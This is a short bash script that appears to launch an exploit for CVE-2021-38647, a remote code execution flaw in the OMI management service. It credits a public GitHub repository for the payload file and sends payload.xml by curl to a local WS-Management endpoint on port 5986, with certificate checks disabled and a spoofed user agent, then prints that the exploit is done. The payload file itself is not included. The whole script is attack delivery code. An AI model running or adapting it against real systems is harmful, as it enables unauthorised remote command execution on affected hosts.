#!/bin/bash

# credit for payload.xml
# https://github.com/midoxnet/CVE-2021-38647

echo -e "\n----- sending payload.xml -----\n"

# use https://curl.se/ for sending

curl -v \
    --insecure \
    --header "Content-Type: application/soap+xml;charset=UTF-8" \
    --user-agent "not curl" \
    --data-binary "@payload.xml" \
    https://127.0.0.1:5986/wsman

echo -e "\n\n----- exploit done! -----\n"
